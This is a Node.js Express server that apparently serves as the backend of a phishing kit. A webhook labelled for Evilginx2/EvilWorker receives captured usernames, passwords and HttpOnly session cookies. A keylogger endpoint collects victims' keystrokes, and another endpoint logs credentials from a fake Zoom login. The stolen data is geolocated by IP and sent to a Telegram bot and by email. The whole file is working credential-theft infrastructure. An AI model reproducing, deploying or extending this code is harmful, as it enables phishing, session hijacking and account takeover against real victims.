require('dotenv').config();

const express = require('express');
const cors = require('cors');
const https = require('https');
const axios = require('axios');
const nodemailer = require('nodemailer');

const app = express();

// --- CONFIGURATION ---
const PORT = process.env.PORT || 3000;
const WEBHOOK_SECRET = process.env.WEBHOOK_SECRET || 'evilginx_webhook_secret_2026';
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
const GMAIL_APP_PASSWORD = process.env.GMAIL_APP_PASSWORD;

// --- ENVIRONMENT CHECK ---
console.log('--- Environment Check ---');
console.log('TELEGRAM_BOT_TOKEN:', TELEGRAM_BOT_TOKEN ? '✅ SET' : '❌ MISSING');
console.log('TELEGRAM_CHAT_ID:', TELEGRAM_CHAT_ID ? '✅ SET' : '❌ MISSING');
console.log('ADMIN_EMAIL:', ADMIN_EMAIL ? '✅ SET' : '⚠️ Optional');
console.log('GMAIL_APP_PASSWORD:', GMAIL_APP_PASSWORD ? '✅ SET' : '⚠️ Optional');
console.log('WEBHOOK_SECRET:', WEBHOOK_SECRET ? '✅ SET' : '⚠️ Using default');
console.log('---------------------------');

// --- MIDDLEWARE ---
app.use(cors({ origin: true, credentials: true }));
app.use(express.json({ limit: '10mb' }));
app.use(express.static('public'));

// --- EMAIL TRANSPORTER ---
let transporter = null;
if (ADMIN_EMAIL && GMAIL_APP_PASSWORD) {
    transporter = nodemailer.createTransport({
        host: 'smtp.gmail.com',
        port: 587,
        secure: false,
        auth: { user: ADMIN_EMAIL, pass: GMAIL_APP_PASSWORD }
    });
    console.log('✅ Email transporter configured');
} else {
    console.log('⚠️ Email alerts disabled');
}

// --- GLOBAL ERROR HANDLERS ---
process.on('uncaughtException', (err) => console.error('🔥 UNCAUGHT EXCEPTION:', err));
process.on('unhandledRejection', (reason) => console.error('🔥 UNHANDLED REJECTION:', reason));

// --- HELPERS ---
function getClientIp(req) {
    return (req.headers['x-forwarded-for'] || '').split(',').pop()?.trim()
        || req.connection?.remoteAddress
        || req.socket?.remoteAddress
        || 'unknown';
}

async function getLocationFromIp(ip) {
    return new Promise((resolve) => {
        const request = https.get(
            `https://ip-api.com/json/${ip}?fields=status,message,city,regionName,country`,
            { timeout: 5000 },
            (resp) => {
                let data = '';
                resp.on('data', chunk => data += chunk);
                resp.on('end', () => {
                    try {
                        const response = JSON.parse(data);
                        resolve(response.status === 'success'
                            ? `${response.city}, ${response.regionName}, ${response.country}`
                            : 'Location unavailable');
                    } catch (e) { resolve('Location error'); }
                });
            }
        );
        request.on('error', () => resolve('Location error'));
        request.on('timeout', () => {
            request.destroy();
            resolve('Location timeout');
        });
    });
}

async function sendToTelegram(text, parseMode = 'Markdown') {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: text,
            parse_mode: parseMode
        });
        console.log('✅ Telegram sent');
    } catch (error) {
        console.error('❌ Telegram error:', error.message);
    }
}

async function sendEmail(subject, htmlBody) {
    if (!transporter) return;
    try {
        await transporter.sendMail({
            from: `"Security Alert" <${ADMIN_EMAIL}>`,
            to: ADMIN_EMAIL,
            subject: subject,
            html: htmlBody
        });
        console.log('📧 Email sent');
    } catch (error) {
        console.error('❌ Email error:', error.message);
    }
}

function formatVisitorInfo(visitorInfo) {
    if (!visitorInfo) return '';
    const fields = [];
    if (visitorInfo.fullUrl) fields.push(`Full URL: ${visitorInfo.fullUrl}`);
    if (visitorInfo.referrer) fields.push(`Referrer: ${visitorInfo.referrer}`);
    if (visitorInfo.userAgent) fields.push(`User Agent: ${visitorInfo.userAgent}`);
    if (visitorInfo.platform) fields.push(`Platform: ${visitorInfo.platform}`);
    if (visitorInfo.deviceType) fields.push(`Device Type: ${visitorInfo.deviceType}`);
    if (visitorInfo.language) fields.push(`Language: ${visitorInfo.language}`);
    if (visitorInfo.timezone) fields.push(`Timezone: ${visitorInfo.timezone}`);
    if (visitorInfo.screenWidth && visitorInfo.screenHeight) {
        fields.push(`Screen Resolution: ${visitorInfo.screenWidth}x${visitorInfo.screenHeight}`);
    }
    if (visitorInfo.sessionId) fields.push(`Session ID: ${visitorInfo.sessionId}`);
    return fields.length ? `\n\n--- Visitor Details ---\n${fields.join('\n')}` : '';
}

// --- WEBHOOK (EvilWorker / Evilginx2) ---
app.post('/webhook', async (req, res) => {
    const secret = req.headers['x-webhook-secret'];
    if (secret !== WEBHOOK_SECRET) return res.status(403).send('Forbidden');

    const data = req.body;
    const ip = getClientIp(req);
    const location = await getLocationFromIp(ip);

    let tgMsg = `🔐 *Capture Report*\n\n`;
    tgMsg += `*Event:* ${data.event || 'Unknown'}\n`;
    tgMsg += `*Location:* ${location}\n`;
    tgMsg += `*IP Address:* ${ip}\n`;
    if (data.username) tgMsg += `*Username:* ${data.username}\n`;
    if (data.password) tgMsg += `*Password:* ${data.password}\n`;
    if (data.user_agent) tgMsg += `*User Agent:* ${data.user_agent}\n`;
    if (data.tokens) {
        tgMsg += `*🍪 Session Cookies (HttpOnly):*\n`;
        for (const [name, value] of Object.entries(data.tokens)) {
            tgMsg += `  \`${name}\`: \`${value}\`\n`;
        }
    }

    let emailHtml = `<h2>🔐 Capture Report</h2><ul>`;
    emailHtml += `<li><strong>Event:</strong> ${data.event}</li>`;
    emailHtml += `<li><strong>Location:</strong> ${location}</li>`;
    emailHtml += `<li><strong>IP:</strong> ${ip}</li>`;
    if (data.username) emailHtml += `<li><strong>Username:</strong> ${data.username}</li>`;
    if (data.password) emailHtml += `<li><strong>Password:</strong> ${data.password}</li>`;
    if (data.user_agent) emailHtml += `<li><strong>User Agent:</strong> ${data.user_agent}</li>`;
    if (data.tokens) {
        emailHtml += `<li><strong>Session Cookies:</strong><pre>${JSON.stringify(data.tokens, null, 2)}</pre></li>`;
    }
    emailHtml += `</ul>`;

    await sendToTelegram(tgMsg);
    await sendEmail('🔐 Capture Report', emailHtml);
    res.sendStatus(200);
});

// --- KEYLOGGER ---
app.post('/api/keylog', async (req, res) => {
    try {
        const { keystrokes, url, userAgent, timestamp, ip: clientIp } = req.body;
        if (!keystrokes) return res.sendStatus(400);

        const ip = clientIp || getClientIp(req);
        const location = await getLocationFromIp(ip);
        const truncated = keystrokes.length > 1000 ? keystrokes.slice(0, 1000) + '...' : keystrokes;

        const tgMsg = `⌨️ *Keylogger Report*\n\n`;
        tgMsg += `*IP:* ${ip}\n`;
        tgMsg += `*Location:* ${location}\n`;
        tgMsg += `*URL:* ${url || 'Unknown'}\n`;
        tgMsg += `*User Agent:* ${userAgent || 'Unknown'}\n`;
        tgMsg += `*Timestamp:* ${timestamp || new Date().toISOString()}\n\n`;
        tgMsg += `*Keystrokes:*\n\`\`\`\n${truncated}\n\`\`\``;

        await sendToTelegram(tgMsg);
        res.sendStatus(200);
    } catch (error) {
        console.error('Keylog error:', error.message);
        res.status(500).send('Error');
    }
});

// --- LOG ACTION (Frontend) ---
app.post('/api/log-action', async (req, res) => {
    try {
        const { action, email, password, visitorInfo } = req.body;
        const ip = getClientIp(req);
        const location = await getLocationFromIp(ip);

        let tgMsg = `🚨 *Zoom Action: ${action?.toUpperCase() || 'UNKNOWN'}*\n`;
        tgMsg += `*Email:* ${email || 'none'}\n`;
        tgMsg += `*Password:* ${password || 'N/A'}\n`;
        tgMsg += `*Location:* ${location}\n`;
        tgMsg += `*IP:* ${ip}\n`;
        tgMsg += `*Time:* ${new Date().toISOString()}`;
        tgMsg += formatVisitorInfo(visitorInfo);

        await sendToTelegram(tgMsg);
        res.json({ success: true });
    } catch (error) {
        console.error('Log error:', error.message);
        res.status(500).json({ success: false });
    }
});

app.listen(PORT, () => console.log(`🚀 Server running on port ${PORT}`));